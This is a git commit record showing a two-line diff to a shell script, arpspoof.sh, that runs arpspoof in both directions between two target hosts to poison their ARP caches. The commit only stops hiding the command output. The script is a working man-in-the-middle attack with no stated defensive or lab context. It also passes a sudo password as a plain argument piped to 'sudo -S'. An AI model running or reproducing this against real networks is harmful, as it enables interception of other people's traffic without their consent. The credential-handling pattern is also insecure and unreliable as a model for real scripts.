f54a700c3d98972e41f8b57c445aee836cb33acf
w4ft <joshzhe@josh-z.local>
2019-05-24 16:06:13 -0400

    reversed

--- sarin_scripts/arpspoof.sh
+++ sarin_scripts/arpspoof.sh
@@ -1,5 +1,5 @@
-echo $3 | sudo -S sudo arpspoof -i en0 -t $1 $2 &> /dev/null
-echo $3 | sudo -S arpspoof -i en0 -t $2 $1 &> /dev/null
+echo $3 | sudo -S sudo arpspoof -i en0 -t $1 $2 &
+echo $3 | sudo -S arpspoof -i en0 -t $2 $1 
 
 
 
